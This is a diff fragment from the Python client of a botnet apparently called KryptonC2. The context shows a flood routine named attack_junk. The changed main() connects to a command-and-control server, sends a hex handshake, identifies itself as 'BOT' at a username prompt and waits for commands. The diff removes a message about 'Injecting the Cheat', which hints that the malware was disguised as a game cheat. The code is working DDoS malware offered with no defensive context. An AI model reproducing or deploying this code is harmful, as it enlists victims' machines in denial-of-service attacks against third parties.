@@ -393,21 +393,20 @@ def attack_junk(ip, port, secs):
         print('Pacote junk enviado')
 
 def main():
-    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    print("[+] Server Lunched, Injecting the Cheat")
-    while 1:
-        try:
-            c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
-            while 1:
-                c2.send('669787761736865726500'.encode())
-                break
-            while 1:
-                time.sleep(1)
-                data = c2.recv(1024).decode()
-                if 'Username' in data:
-                    c2.send('BOT'.encode())
+        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        while 1:
+            try:
+                c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
+                while 1:
+                    c2.send('669787761736865726500'.encode())
                     break
+                while 1:
+                    time.sleep(1)
+                    data = c2.recv(1024).decode()
+                    if 'Username' in data:
+                        c2.send('BOT'.encode())
+                        break
                 while 1:
                     time.sleep(1)
                     data = c2.recv(1024).decode()
